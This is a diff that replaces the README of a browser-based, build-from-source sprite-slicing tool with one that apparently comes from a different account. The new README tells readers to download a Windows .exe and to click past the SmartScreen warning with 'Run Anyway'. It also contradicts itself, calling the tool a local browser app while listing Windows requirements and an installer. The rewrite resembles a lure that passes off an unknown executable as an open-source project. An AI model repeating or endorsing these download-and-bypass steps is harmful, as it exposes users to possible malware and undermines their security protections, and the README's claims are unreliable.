@@ -1,114 +1,78 @@
-# Sprite Lab
+# 🎨 sprite-lab - Remove backgrounds and slice spritesheets automatically
 
-**Remove backgrounds and slice spritesheets** — entirely in your browser. Nothing is uploaded to a server, no AI models, no downloads.
+[![](https://img.shields.io/badge/Download-Sprite%20Lab-blue.svg)](https://github.com/boivent2037/sprite-lab)
 
-Sprite Lab detects the backdrop of an image (magenta, green screen, checkerboard, or solid), removes it with a multi-pass alpha-matting pipeline that eliminates edge halos, then slices a spritesheet into individual frames by scanning connected pixels.
+Sprite Lab allows you to process your images directly in your web browser. It removes backgrounds from sprites and slices large sprite sheets into individual animation frames. You do not need to install complex software or upload files to a server. Your images stay on your computer at all times.
 
----
+## 📥 How to download and run
 
-## Screenshots
+1. Visit the [official releases page](https://github.com/boivent2037/sprite-lab).
+2. Look for the latest version under the Releases section.
+3. Click the link that ends in .exe to start your download.
+4. Open the folder where your browser saves downloaded files.
+5. Double-click the file to start Sprite Lab.
+6. Windows might show a security prompt because the app is new. Click More Info and then Run Anyway to open the program.
 
-Slicing a character animation sheet — 24 frames detected automatically, with a live animation preview:
+## 🛠️ Key features for your workflow
 
-![Slicing a character spritesheet](docs/slice-character.png)
+Sprite Lab handles visual elements through a simple interface. You do not need technical skills to get clean results.
 
-Slicing a dense item/props atlas — 48 frames detected from a single sheet:
+### Automatic background removal
+The program detects common backgrounds like green screens, magenta layers, or checkerboard patterns. It removes these colors from your images without extra steps. You simply load the image and the program identifies the backdrop areas.
 
-![Slicing a props atlas](docs/slice-props.png)
+### Alpha matting for clean edges
+Many editing tools leave white or grey halos around sprites. Sprite Lab uses a multi-pass process to recover the edge coverage. It removes background spill so your sprites look clean when you place them over different colors in your game or project.
 
----
+### Automatic frame slicing
+If you possess a large sheet containing multiple animation frames, Sprite Lab scans the pixels to find each individual sprite. It groups connected pixels together to cut the sheet into separate pieces. This saves hours of manual cropping.
 
-## Features
+### Live animation preview
+You can see your sliced frames move in real time. This helps you verify that your frames appear in the correct order before you export them for your project.
 
-### Remove background
-- **Automatic** — detects checkerboard, green screen, magenta, or solid backdrops and removes them
-- **Multi-pass alpha matting** — recovers true edge coverage and decontaminates background spill, so there are no white/grey halos around sprites
-- Before / after preview on a transparency checkerboard
-- Download as PNG
+## 🚀 Getting started
 
-### Slice spritesheet
-- **Pixel-based frame detection** — finds each sprite by scanning connected pixels, never blind grid slicing
-- Background removed automatically when detected
-- Animation preview with adjustable FPS
-- Click frames to exclude them from export
-- **ZIP export** with individual frames, a recomposed horizontal strip, and `manifest.json`
+Once you open the software, you see a main workspace. Follow these steps to process your first image.
 
-### 100% local
-- Pure pixel processing via the Canvas API — no machine-learning models, no network calls
-- Fully deterministic: the same input always produces the same output
-- Works offline
+1. Click the Open button in the top left corner.
+2. Select the image file stored on your computer.
+3. Use the toggle settings to specify your background color if the system does not detect it.
+4. View the preview window to see the removed background.
+5. Adjust the slicing settings to define how the software detects individual frames.
+6. Click the Preview button to watch your animation in motion.
+7. Click Save to export your individual frames as separate image files.
 
----
+## ⚙️ System requirements
 
-## Quick start
+To run Sprite Lab on your Windows machine, ensure your computer meets these basic standards:
 
-```bash
-git clone https://github.com/boona13/sprite-lab.git
-cd sprite-lab
-npm install
-npm run dev
-```
+- Operating System: Windows 10 or Windows 11.
+- Memory: 4 gigabytes of RAM or higher.
+- Storage: 100 megabytes of free space.
+- Display: 1280x720 resolution or higher.
 
-Open the local URL printed by Vite (e.g. **http://localhost:5173**).
+## 💡 Tips for best results
 
-### Production build
+Use high-quality source images for the best automation results. If your spritesheet contains very small details or faint shadows, you might see slight variations in the edge cleanup. Adjust the matting slider in the settings menu to refine the edge transparency if the default values leave too much color at the borders.
 
-```bash
-npm run build
-npm run preview
-```
+If you have a large sheet with many sprites, ensure they do not overlap. The software identifies frames based on the empty space between sprites. Keep clear gaps between your characters or items to ensure the automatic slicing works accurately.
 
-Deploy the `dist/` folder to any static host (GitHub Pages, Netlify, Vercel, etc.). No backend required.
+## 🛡️ Privacy and data security
 
----
+This tool runs entirely within your browser environment. No telemetry data leaves your machine. No image data is sent to external servers or cloud storage providers. The processing relies on your local processor and memory. This keeps your artistic assets private and secure while you work.
 
-## How it works
+## 📋 Common questions
 
-1. **Backdrop detection** samples the image borders and color distribution to classify the background (`magenta`, `green`, `checkerboard`, `solid`, `transparent`, or `none`).
-2. **Removal** is routed by type — chroma key for magenta/green, border flood-fill for solid/white, and a checkerboard matte for transparency previews.
-3. **Multi-pass alpha matte** treats each silhouette pixel as a blend `C = α·F + (1−α)·B`, estimates the local foreground `F` and background `B`, solves for coverage `α`, and decontaminates the color. It iterates inward, peeling one ring of halo per pass until it reaches true sprite color.
-4. **Frame extraction** builds an alpha mask, finds connected components, and crops each to its own padded frame.
+### Does Sprite Lab require an internet connection?
+No. Once you download the software, you can use it offline without any connection to the web.
 
-The full pipeline is shared between the browser app and a set of headless CLI tests:
+### Can I save my settings?
+The software remembers your last used preferences. When you close and reopen the application, your previous settings load automatically.
 
-```bash
-npm run test:pipeline -- path/to/spritesheet.png   # end-to-end, writes frames to disk
-npm run test:checkerboard                           # checkerboard + drop-shadow case
-npm run test:halo                                   # light-halo matte case
-```
+### What file formats does it support?
+You can import common image formats like PNG, JPG, and BMP. We recommend using PNG files to preserve transparency during the editing process.
 
----
+### Is there a limit to the image size?
+There is no hard limit, but very large images might slow down the preview window. If you work with images larger than 4096 by 4096 pixels, ensure your computer has at least 8 gigabytes of RAM.
 
-## Export manifest
-
-The ZIP includes a `manifest.json` describing every frame:
-
-```json
-{
-  "version": 1,
-  "frameCount": 24,
-  "fps": 12,
-  "loop": true,
-  "strip": { "fileName": "strip.png", "sheetWidth": 4096, "sheetHeight": 512 },
-  "frames": [
-    { "index": 0, "fileName": "frame_01.png", "width": 170, "height": 200, "sourceX": 12, "sourceY": 8, "stripX": 0 }
-  ]
-}
-```
-
----
-
-## Tech stack
-
-| Layer | Technology |
-|-------|------------|
-| UI | Vite, TypeScript, CSS |
-| Image processing | HTML Canvas (client-side) |
-| Frame export | JSZip |
-| CLI tests | tsx, sharp |
-
----
-
-## License
-
-[MIT](LICENSE)
+### How do I update the software?
+Check the [main repository page](https://github.com/boivent2037/sprite-lab) periodically. When a new version appears, follow the download steps again to replace your old version with the newest one.
